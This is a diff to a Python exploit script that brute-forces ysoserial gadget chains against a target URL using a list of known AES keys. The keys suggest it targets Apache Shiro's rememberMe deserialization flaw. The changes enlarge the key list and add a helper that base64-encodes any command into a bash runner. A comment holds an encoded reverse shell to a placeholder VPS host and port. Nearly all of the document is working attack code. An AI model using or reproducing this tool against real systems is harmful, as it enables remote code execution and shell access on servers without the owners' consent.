@@ -16,30 +16,52 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 JAR_FILE = 'ysoserial.jar'
 
 KEYS = (
-    '1QWLxg+NYmxraMoxAXu/Iw==',
-    '2AvVhdsgUs0FSA3SDFAdag==',
-    '3AvVhmFLUs0KTA3Kprsdag==',
-    '4AvVhmFLUs0KTA3Kprsdag==',
-    '5aaC5qKm5oqA5pyvAAAAAA==',
-    '5AvVhmFLUs0KTA3Kprsdag==',
-    '6ZmI6I2j5Y+R5aSn5ZOlAA==',
-    'a2VlcE9uR29pbmdBbmRGaQ==',
-    'bWljcm9zAAAAAAAAAAAAAA==',
-    'bWluZS1hc3NldC1rZXk6QQ==',
-    'cmVtZW1iZXJNZQAAAAAAAA==',
-    'fCq+/xW488hMTCD+cmJ3aQ==',
     'kPH+bIxk5D2deZiIxcaaaA==',
-    'L7RioUULEFhRyxM7a2R/Yg==',
-    'MTIzNDU2Nzg5MGFiY2RlZg==',
-    'r0e3c16IdVkouZgk1TKVMg==',
-    'RVZBTk5JR0hUTFlfV0FPVQ==',
-    'U3ByaW5nQmxhZGUAAAAAAA==',
-    'WcfHGU25gNnTxTlmJMeSpw==',
-    'wGiHplamyXlVB11UXWol8g==',
-    'WkhBTkdYSUFPSEVJX0NBVA==',
+    '2AvVhdsgUs0FSA3SDFAdag==',
+    '1QWLxg+NYmxraMoxAXu/Iw==',
+    '4AvVhmFLUs0KTA3Kprsdag==',
+    '6ZmI6I2j3Y+R1aSn5BOlAA==',
+    '7AvVhmFLUs0KTA3Kprsdag==',
     'Z3VucwAAAAAAAAAAAAAAAA==',
+    'RVZBTk5JR0hUTFlfV0FPVQ==',
+    'r0e3c16IdVkouZgk1TKVMg==',
+    'ZUdsaGJuSmxibVI2ZHc9PQ==',
+    'bWljcm9zAAAAAAAAAAAAAA==',
+    'MTIzNDU2Nzg5MGFiY2RlZg==',
+    '2adsfasdqerqerqewradsf==',
+    'ZAvph3dsQs0FSL3SDFAdag==',
+    '3AvVhmFLUs0KTA3Kprsdag==',
+    '66v1O8keKNV3TTcGPK1wzg==',
+    '5aaC5qKm5oqA5pyvAAAAAA==',
+    'wGiHplamyXlVB11UXWol8g==',
+    'V2hhdCBUaGUgSGVsbAAAAA==',
+    'bWluZS1hc3NldC1rZXk6QQ==',
+    'vXP33AonIp9bFwGl7aT7rA==',
+    '4AvVhmFLUs5KTA1Kprsdag==',
     'ZnJlc2h6Y24xMjM0NTY3OA==',
-    'ZUdsaGJuSmxibVI2ZHc9PQ=='
+    'WcfHGU25gNnTxTlmJMeSpw==',
+    'mIccZhQt6EBHrZIyw1FAXQ==',
+    'QF5HMyZAWDZYRyFnSGhTdQ==',
+    '9E9uBV19JjhIVjsOA+5vqQ==',
+    'AztiX2RUqhc7dhOzl1Mj8Q==',
+    'OY//C4rhfwNxCQAQCrQQ1Q==',
+    'YystomRZLMUjiK0Q1+LFdw==',
+    'bXRvbnMAAAAAAAAAAAAAAA==',
+    'Q01TX0JGTFlLRVlfMjAxOQ==',
+    'L7RioUULEFhRyxM7a2R/Yg==',
+    'U3BAbW5nQmxhZGUAAAAAAA==',
+    'fCq+/xW488hMTCD+cmJ3aQ==',
+    '5AvVhmFLUs0KTA3Kprsdag==',
+    'cmVtZW1iZXJNZQAAAAAAAA==',
+    'WkhBTkdYSUFPSEVJX0NBVA==',
+    'c2hpcm9fYmF0aXMzMgAAAA==',
+    '1AvVhdsgUs0FSA3SDFAdag==',
+    'MTIzNDU2NzgxMjM0NTY3OA==',
+    'U3ByaW5nQmxhZGUAAAAAAA==',
+    '6ZmI6I2j5Y+R5aSn5ZOlAA==',
+    'wrjUh2ttBPQLnT4JVhriug==',
+    'yeAAo1E8BOeAYfBlm4NG9Q==',
+    'a2VlcE9uR29pbmdBbmRGaQ=='
 )
 
 GADGETS = (
@@ -55,6 +77,16 @@ GADGETS = (
     'CommonsCollections9',
     'CommonsCollections10'
 )
+
+
+def get_command(command):
+    # command = 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC92cHNfaXAvcG9ydCAwPiYx}|{base64,-d}|{bash,-i}'
+    # command encode http://www.jackson-t.ca/runtime-exec-payloads.html
+
+    base64_command = str(base64.b64encode(bytes(command, encoding='utf-8')), encoding='utf-8')
+    encoded_command = 'bash -c {echo,' + base64_command + '}|{base64,-d}|{bash,-i}'
+
+    return encoded_command
 
 
 def get_payload(command, gadget, key):
@@ -84,54 +116,51 @@ def send_payload(url, payload):
     }
 
     try:
-        r = requests.get(url, headers=headers, cookies=cookies, timeout=30, verify=False)
+        res = requests.get(url, headers=headers, cookies=cookies, timeout=30, verify=False)
     except Exception as e:
         print(e)
         return False
 
-    if(r.status_code==200):
-        print(' Succeed! Code: {}'.format(str(r.status_code)))
-        return True
-    else:
-        print(' Failed! Code: {}'.format(str(r.status_code)))
-        return False
+    return res
 
 
-def scan(url, command, gadget=None, key=None):
-    if gadget is None:
+def scan(url, command, gadget='', key='', flag=''):
+    if gadget == '':
         scan_gadgets = GADGETS
     else:
         scan_gadgets = (gadget,)
 
-    if key is None:
+    if key == '':
         scan_keys = KEYS
     else:
         scan_keys = (key,)
 
     for gadget in scan_gadgets:
         for key in scan_keys:
-            print(gadget, key, end='')
-            payload = get_payload(command, gadget, key)
-            send_payload(url, payload)
-        
+            if command.find(flag) != -1:
+                new_command = command.replace(flag, f'{gadget}{key}')
+
+            encoded_command = get_command(new_command)
+            payload = get_payload(encoded_command, gadget, key)
+            res = send_payload(url, payload)
+            print(f'{gadget} {key} {new_command} code: {res.status_code}')
+
 
 def get_parser():
     parser = argparse.ArgumentParser()
 
     parser.add_argument('-u', '--url', type=str, required=True, help='target url')
     parser.add_argument('-c', '--command', type=str, required=True, help='execute command')
-    parser.add_argument('-g', '--gadget', required=False, default=None, help='gadget')
-    parser.add_argument('-k', '--key', required=False, default=None, help='aes key')
+    parser.add_argument('-g', '--gadget', required=False, default='', help='gadget')
+    parser.add_argument('-k', '--key', required=False, default='', help='aes key')
+    parser.add_argument('-f', '--flag', required=False, default='', help='flag')
 
     return parser
 
-
-# command = 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC92cHNfaXAvcG9ydCAwPiYx}|{base64,-d}|{bash,-i}'
-# command encode http://www.jackson-t.ca/runtime-exec-payloads.html
 
 if __name__ == '__main__':
 
     parser = get_parser()
     args = parser.parse_args()
 
-    scan(args.url, args.command, args.gadget, args.key)
+    scan(args.url, args.command, args.gadget, args.key, args.flag)
